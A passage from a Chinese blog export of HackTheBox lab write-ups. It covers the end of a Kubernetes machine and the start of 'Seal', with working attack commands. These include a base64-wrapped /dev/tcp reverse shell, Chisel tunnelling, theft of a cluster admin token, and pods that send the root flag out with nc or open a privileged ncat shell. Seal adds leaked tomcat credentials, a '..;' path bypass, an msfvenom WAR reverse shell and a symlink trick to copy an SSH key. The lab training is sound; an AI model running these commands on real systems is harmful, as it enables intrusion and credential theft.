Firefox/78.0\"\nPROXY=\"127.0.0.1:8080\"\nTEXT=\"$1\"\n\ncat - <<EOF > message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"message\":\n    {\n        \"text\":${TEXT}\n    }\n}\nEOF\n\ncurl -s \\\n     -X PUT \\\n     -A \"${UA}\" \\\n     -H \"Content-Type: application/json\" \\\n     -d \"$(cat message.json | jq -c)\" \\\n     -x \"${PROXY}\" \\\n     \"http://${RHOST}:${RPORT}/\" \\\n| jq .\n```\n```Plain Text\n#!/bin/bash\n\nRHOST=\"127.0.0.1\"\nRPORT=3000\nUA=\"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\"\nPROXY=\"127.0.0.1:8080\"\nFILE=$1\n\ncat - <<EOF > message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"filename\":\"${FILE}\"\n}\nEOF\n\ncurl -s \\\n     -A \"${UA}\" \\\n     -H \"Content-Type: application/json\" \\\n     -d \"$(cat message.json | jq -c)\" \\\n     -x \"${PROXY}\" \\\n     -o /dev/null \\\n     \"http://${RHOST}:${RPORT}/upload\"\n```\n我们需要使用`Chisel`将端口转发到`devnode-deployment`容器`“172.17.0.8:3000”` \n\n> 参考视频 https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s\n\n> 下载地址 https://github.com/jpillora/chisel\n\n> 如果遇到connect: connection refused，解决方案 https://blog.csdn.net/hhyukJae/article/details/106980818\n\n```Plain Text\n命令执行步骤\ngo chisel\ndu -hs chisel\ngo build -ldflags=\"-s -w\"\nupx brute chisel\ndu -hs chisel\n```\n然后使用python3开启一个http服务以后，使用wget下载到靶机里\n\n给chisel一个777权限后，使用chisel开启一个服务\n\n```Plain Text\n本地运行\nchmod 777 chisel\n./chisel server -p 9999 --reverse\n\n┌──(root💀root)-[~/Desktop/chisel]\n└─# ./chisel server -p 9999 --reverse\n2021/07/17 02:45:18 server: Reverse tunnelling enabled\n2021/07/17 02:45:18 server: Fingerprint kcPnWygZKzUCU+9rAzUk0r6I13LgnEuy/vKZsUNEgCQ=\n2021/07/17 02:45:18 server: Listening on http://0.0.0.0:9999\n```\n```Plain Text\n靶机运行\nchmod 777 chisel\n./chisel client 10.10.14.53:9999 R:3000:172.17.0.8:3000\n\nroot@webapp-deployment-5d764566f4-mbprj:/tmp# ./chisel client 10.10.14.53:9999 R:3000:172.17.0.8:3000\n<isel client 10.10.14.53:9999 R:3000:172.17.0.8:3000\n2021/07/16 19:04:27 client: Connecting to ws://10.10.14.53:9999\n2021/07/16 19:04:29 client: Connected (Latency 251.63886ms)\n```\n然后现在让我们运行修改后的`exploit.sh`\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# ./exploit.sh '{\"constructor\":{\"prototype\":{\"canDelete\":true, \"canUpload\":true}}}'                                                                                                                         4 ⨯\n{\n  \"ok\": true\n}\n```\n然后运行`exploit2.sh`\n\n```Plain Text\n./exploit2.sh \"& echo $(echo 'bash -i >& /dev/tcp/10.10.14.53/5555 0>&1' | base64) | base64 -d | bash\"\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nc -nvlp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.53] from (UNKNOWN) [10.10.10.235] 58012\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@devnode-deployment-cd86fb5c-6ms8d:/usr/src/app# whoami && id\nwhoami && id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功获得另一个shell\n\n然后我们到`/tmp/`目录下继续运行`kubectl`脚本\n\n```Plain Text\ncd /tmp\n./kubectl-lucifiel get secrets -n kube-system\n\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl-lucifiel get secrets -n kube-system\n</tmp# ./kubectl-lucifiel get secrets -n kube-system\nNAME                                             TYPE                                  DATA   AGE\nattachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      180d\nbootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      180d\nc-admin-token-tfmp2                              kubernetes.io/service-account-token   3      180d\ncertificate-controller-token-thnxw               kubernetes.io/service-account-token   3      180d\nclusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      180d\ncoredns-token-dbp92                              kubernetes.io/service-account-token   3      180d\ncronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      180d\ndaemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      180d\ndefault-token-l85f2                              kubernetes.io/service-account-token   3      180d\ndeployment-controller-token-cwgst                kubernetes.io/service-account-token   3      180d\ndisruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      180d\nendpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      180d\nendpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      180d\nendpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      180d\nexpand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      180d\ngeneric-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      180d\nhorizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      180d\njob-controller-token-h6kg8                       kubernetes.io/service-account-token   3      180d\nkube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      180d\nnamespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      180d\nnode-controller-token-k6p6v                      kubernetes.io/service-account-token   3      180d\npersistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      180d\npod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      180d\npv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      180d\npvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      180d\nreplicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      180d\nreplication-controller-token-jz8k8               kubernetes.io/service-account-token   3      180d\nresourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      180d\nroot-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      180d\nservice-account-controller-token-44bfm           kubernetes.io/service-account-token   3      180d\nservice-controller-token-pzjnq                   kubernetes.io/service-account-token   3      180d\nstatefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      180d\nstorage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      180d\ntoken-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      180d\nttl-controller-token-z87px                       kubernetes.io/service-account-token   3      180d\n```\n接着让我们获取令牌\n\n```Plain Text\n./kubectl-lucifiel describe secrets/c-admin-token-tfmp2 -n kube-system\n\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl-lucifiel describe secrets/c-admin-token-tfmp2 -n kube-system\n<describe secrets/c-admin-token-tfmp2 -n kube-system\nName:         c-admin-token-tfmp2\nNamespace:    kube-system\nLabels:       <none>\nAnnotations:  kubernetes.io/service-account.name: c-admin\n              kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0\n\nType:  kubernetes.io/service-account-token\n\nData\n====\ntoken:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow\nca.crt:     1066 bytes\nnamespace:  11 bytes\n```\n让我们列出token\n\n```Plain Text\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# /tmp/kubectl-lucifiel --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info\n<579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info\nKubernetes control plane is running at https://10.96.0.1:443\nKubeDNS is running at https://10.96.0.1:443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy\n\nTo further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.\n```\n在本地创建一个`lucifiel.yaml`脚本\n\n```Plain Text\napiVersion: v1\nkind: Pod\nmetadata:\n  name: some-pod\n  namespace: default\nspec:\n  containers:\n    - name: web\n      image: localhost:5000/dev-alpine\n      command: [\"/bin/sh\"]\n      args: [\"-c\", 'cat /root/root.txt | nc -nv 10.10.14.53 6666; sleep 100000']\n      volumeMounts:\n      - mountPath: /root/\n        name: root-flag\n  volumes:\n  - hostPath:\n      path: /root/\n      type: \"\"\n    name: root-flag\n```\n然后本地监听一个端口，并保存文件为`root.txt`\n\n```Plain Text\nnc -nvlp 6666 > root.txt\n```\n然后运行该脚本\n\n```Plain Text\n/tmp/kubectl-lucifiel create -f /tmp/lucifiel.yaml --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# cat root.txt\nfd72e8e095033f233d31c383e5c0391b\n```\n成功拿到root权限的flag文件 ## 题外话 这几天事情有点多，再加上一些这样那样的情况吧，导致比较忙。所以这次的靶场就没有写的非常细致，有很多东西都是一下就略过了，请大家见谅。等过段时间忙完了就会恢复质量。\n\n最后一步如果想要获得一个shell，就使用这个脚本\n\n```Plain Text\napiVersion: v1\nkind: Pod\nmetadata:\n  name: everything-allowed-revshell-pod\n  labels:\n    app: pentest\nspec:\n  hostNetwork: true\n  hostPID: true\n  hostIPC: true\n  containers:\n  - name: everything-allowed-pod\n    image: raesene/ncat\n    command: [ \"/bin/sh\", \"-c\", \"--\" ]\n    args: [ \"ncat --ssl $HOST $PORT -e /bin/bash;\" ]\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /host\n      name: noderoot\n  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name\n  volumes:\n  - name: noderoot\n    hostPath:\n      path: /\n```","tags":["Hackthebox"]},{"title":"Seal - Hackthebox","url":"/2021/07/12/Hackthebox/Medium/Hackthebox-Seal/","content":"\n# Hackthebox - Seal\n## 靶场信息\n![](Hackthebox-Seal/image1.png)\n\n## 靶场类型\n![](Hackthebox-Seal/image2.png)\n\n## 信息搜集 首先使用Nmap进行信息搜集\n```Plain Text\nnmap -A -sS -sC -sV -p- 10.10.10.250\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nmap -A -sS -sC -sV -p- 10.10.10.250\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 12:42 CST\nNmap scan report for 10.10.10.250\nHost is up (0.24s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)\n|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)\n|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)\n443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Seal Market\n| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK\n| Not valid before: 2021-05-05T10:24:03\n|_Not valid after:  2022-05-05T10:24:03\n| tls-alpn:\n|_  http/1.1\n| tls-nextprotoneg:\n|_  http/1.1\n8080/tcp open  http-proxy\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.1 401 Unauthorized\n|     Date: Mon, 12 Jul 2021 05:05:34 GMT\n|     Set-Cookie: JSESSIONID=node01f74sr5qgmlr67kq6xg2imreb3.node0; Path=/; HttpOnly\n|     Expires: Thu, 01 Jan 1970 00:00:00 GMT\n|     Content-Type: text/html;charset=utf-8\n|     Content-Length: 0\n|   GetRequest:\n|     HTTP/1.1 401 Unauthorized\n|     Date: Mon, 12 Jul 2021 05:05:32 GMT\n|     Set-Cookie: JSESSIONID=node071ucs4ccblk71m8qso25gjtua1.node0; Path=/; HttpOnly\n|     Expires: Thu, 01 Jan 1970 00:00:00 GMT\n|     Content-Type: text/html;charset=utf-8\n|     Content-Length: 0\n|   HTTPOptions:\n|     HTTP/1.1 200 OK\n|     Date: Mon, 12 Jul 2021 05:05:33 GMT\n|     Set-Cookie: JSESSIONID=node01dhmxhla4mm47fdkiw6xmfoxq2.node0; Path=/; HttpOnly\n|     Expires: Thu, 01 Jan 1970 00:00:00 GMT\n|     Content-Type: text/html;charset=utf-8\n|     Allow: GET,HEAD,POST,OPTIONS\n|     Content-Length: 0\n|   RPCCheck:\n|     HTTP/1.1 400 Illegal character OTEXT=0x80\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 71\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>\n|   RTSPRequest:\n|     HTTP/1.1 505 Unknown Version\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 58\n|     Connection: close\n|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>\n|   Socks4:\n|     HTTP/1.1 400 Illegal character CNTL=0x4\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 69\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>\n|   Socks5:\n|     HTTP/1.1 400 Illegal character CNTL=0x5\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 69\n|     Connection: close\n|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>\n| http-auth:\n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Server returned status 401 but no WWW-Authenticate header.\n|_http-title: Site doesn't have a title (text/html;charset=utf-8).\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.91%I=7%D=7/12%Time=60EBCAB6%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,F4,\"HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDate:\\x20Mon,\\x2012\\x2\nSF:0Jul\\x202021\\x2005:05:32\\x20GMT\\r\\nSet-Cookie:\\x20JSESSIONID=node071ucs\nSF:4ccblk71m8qso25gjtua1\\.node0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\x20Thu\nSF:,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nContent-Type:\\x20text/html\nSF:;charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(HTTPOptions,108,\"HTT\nSF:P/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Mon,\\x2012\\x20Jul\\x202021\\x2005:05:33\\x\nSF:20GMT\\r\\nSet-Cookie:\\x20JSESSIONID=node01dhmxhla4mm47fdkiw6xmfoxq2\\.nod\nSF:e0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x20\nSF:00:00:00\\x20GMT\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nAllow:\\x\nSF:20GET,HEAD,POST,OPTIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRequest\nSF:,AD,\"HTTP/1\\.1\\x20505\\x20Unknown\\x20Version\\r\\nContent-Type:\\x20text/ht\nSF:ml;charset=iso-8859-1\\r\\nContent-Length:\\x2058\\r\\nConnection:\\x20close\\\nSF:r\\n\\r\\n<h1>Bad\\x20Message\\x20505</h1><pre>reason:\\x20Unknown\\x20Version\nSF:</pre>\")%r(FourOhFourRequest,F4,\"HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDa\nSF:te:\\x20Mon,\\x2012\\x20Jul\\x202021\\x2005:05:34\\x20GMT\\r\\nSet-Cookie:\\x20J\nSF:SESSIONID=node01f74sr5qgmlr67kq6xg2imreb3\\.node0;\\x20Path=/;\\x20HttpOnl\nSF:y\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nConten\nSF:t-Type:\\x20text/html;charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(\nSF:Socks5,C3,\"HTTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20CNTL=0x5\\r\\nCont\nSF:ent-Type:\\x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nC\nSF:onnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x\nSF:20Illegal\\x20character\\x20CNTL=0x5</pre>\")%r(Socks4,C3,\"HTTP/1\\.1\\x2040\nSF:0\\x20Illegal\\x20character\\x20CNTL=0x4\\r\\nContent-Type:\\x20text/html;cha\nSF:rset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\r\\n\\r\\\nSF:n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20Illegal\\x20character\\x20\nSF:CNTL=0x4</pre>\")%r(RPCCheck,C7,\"HTTP/1\\.1\\x20400\\x20Illegal\\x20characte\nSF:r\\x20OTEXT=0x80\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nCon\nSF:tent-Length:\\x2071\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x2\nSF:0400</h1><pre>reason:\\x20Illegal\\x20character\\x20OTEXT=0x80</pre>\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=7/12%OT=22%CT=1%CU=41179%PV=Y%DS=2%DC=T%G=Y%TM=60EBCAE\nOS:5%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   241.94 ms 10.10.14.1\n2   242.04 ms 10.10.10.250\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 716.52 seconds\n```\n从上面的扫描结果，我们得到了几个信息 - 开启了`22`、`443`和`8080`端口 - `8080`端口是一个http服务 - `8080`端口显示401，但可以访问\n\n我们访问一下8080端口\n\n![](Hackthebox-Seal/image3.png)\n\n发现这是一个登录框，使用的cms是gitbucket\n\n随便注册一个账号登陆后，发现了关于nginx和tomcat的东西，目前怀疑该系统使用了nginx或者tomcat进行搭建\n\n登陆后发现了一个名为seal\\_market的repo，这应该是443端口的代码库。但我们无法通过IP进行访问443端口，应该是需要添加一个域名\n\n```Plain Text\necho 10.10.10.250 seal.htb >> /etc/hosts\n```\n![](Hackthebox-Seal/image4.png)\n\n运行后发现确实8080端口的gitbucket是443端口的代码库\n\n![](Hackthebox-Seal/image5.png)\n\n我们在8080端口上可以看到有一些待办事项\n\n```Plain Text\nRemove mutual authentication for dashboard, setup registration and login features.\nDeploy updated tomcat configuration.\nDisable manager and host-manager.\n```\n![](Hackthebox-Seal/image6.png)\n\n在尝试更新\n\n```Plain Text\ntomcat/tomcat-users.xml\n```\n文件的时候，找到了tomcat的账号密码\n\n```Plain Text\nhttp://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7\nusername = tomcat\npassword = 42MrHBf*z8{Z%\n```\n![](Hackthebox-Seal/image7.png)\n\n在尝试查看robots.txt的时候，提示404，但从这个404状态页面我们可以知道，该服务器使用了tomcat，并且我们手里拿到了tomcat的账号密码，那我们就直接登录吧\n\n```Plain Text\nhttps://seal.htb/manager/status\n```\n直接使用tomcat默认的地址进行登录，然后进到了tomcat的管理页面 ## 漏洞利用\n\n```Plain Text\nhttps://seal.htb/manager/status/..;/html\n```\n我们直接使用msfvenom生成一个war马，然后上传利用即可\n\n```Plain Text\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f war -o shell.war\n```\n然后去上传到靶机里\n\n![](Hackthebox-Seal/image8.png)\n\n上传的时候提示403，有点迷惑。\n\n经过各种尝试后发现，这是白名单过滤，咱们需要抓包然后绕过一下\n\n```Plain Text\n原URL\nPOST /manager/html/upload;jsessionid=55F7E6377E4EE40C4466AB9F3403C5C9?org.apache.catalina.filters.CSRF_NONCE=229A49D013A85C24C1703530CB2440AD HTTP/1.1\n```\n```Plain Text\n修改为\nPOST /manager/status/..;/html/upload;jsessionid=55F7E6377E4EE40C4466AB9F3403C5C9?org.apache.catalina.filters.CSRF_NONCE=229A49D013A85C24C1703530CB2440AD HTTP/1.1\n```\n![](Hackthebox-Seal/image9.png)\n\n咱们可以看到，shell成功上传，咱们本地使用nc监听一个端口\n\n```Plain Text\nnc -nvlp 4444\n```\n然后访问一下shell页面\n\n```Plain Text\nhttps://seal.htb/shell/\n```\n使用python3获取一个稳定的shell链接\n\n```Plain Text\npython3 -c 'import pty;pty.spawn(\"/bin/bash\");'\n```\n成功获得一个shell\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.24] from (UNKNOWN) [10.10.10.250] 32984\npython3 -c 'import pty;pty.spawn(\"/bin/bash\");'\ntomcat@seal:/var/lib/tomcat9$\n```\n```Plain Text\ntomcat@seal:/home/luis$ ls -la\nls -la\ntotal 51320\ndrwxr-xr-x 9 luis luis     4096 May  7 07:01 .\ndrwxr-xr-x 3 root root     4096 May  5 12:52 ..\ndrwxrwxr-x 3 luis luis     4096 May  7 06:00 .ansible\nlrwxrwxrwx 1 luis luis        9 May  5 12:57 .bash_history -> /dev/null\n-rw-r--r-- 1 luis luis      220 May  5 12:52 .bash_logout\n-rw-r--r-- 1 luis luis     3797 May  5 12:52 .bashrc\ndrwxr-xr-x 3 luis luis     4096 May  7 07:00 .cache\ndrwxrwxr-x 3 luis luis     4096 May  5 13:45 .config\ndrwxrwxr-x 6 luis luis     4096 Jul 12 06:14 .gitbucket\n-rw-r--r-- 1 luis luis 52497951 Jan 14 02:51 gitbucket.war\ndrwxrwxr-x 3 luis luis     4096 May  5 13:41 .java\ndrwxrwxr-x 3 luis luis     4096 May  5 14:33 .local\n-rw-r--r-- 1 luis luis      807 May  5 12:52 .profile\ndrwx------ 2 luis luis     4096 May  7 06:10 .ssh\n-r-------- 1 luis luis       33 Jul 12 06:15 user.txt\n```\n在用户目录luis下找到了user.txt文件，但我们没有权限访问，不过存在一个.ssh目录，并且我们是有权限进行访问的，我们访问看看\n\n在目录`/opt/backups/playbook`中，找到了一个`rum.yml`文件，咱们查看一下内容\n\n```Plain Text\n- hosts: localhost\n  tasks:\n  - name: Copy Files\n    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes\n  - name: Server Backups\n    archive:\n      path: /opt/backups/files/\n      dest: \"/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz\"\n  - name: Clean\n    file:\n      state: absent\n      path: /opt/backups/files/\n```\n思路这不就来了吗\\~\n\n根据解读`run.yml`文件，咱们可以创建一个指向`luis`的`id_rsa`的链接，我们可以把它放到`/uploads`目录中\n\n```Plain Text\n/opt/backups/archives\nln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa\ncp backup-2021-07-12-08:46:33.gz /dev/shm\ncd /dev/shm\nmv backup-2021-07-12-08:46:33.gz backup.tar.gz\ntar -xvf backup.tar.gz\n```\n在目录`/dev/shm/dashboard/uploads`中，我们可以看到我们的id\\_rsa文件，我们查看一下内容\n\n```Plain Text\n-----BEGIN OPENSSH PRIVATE 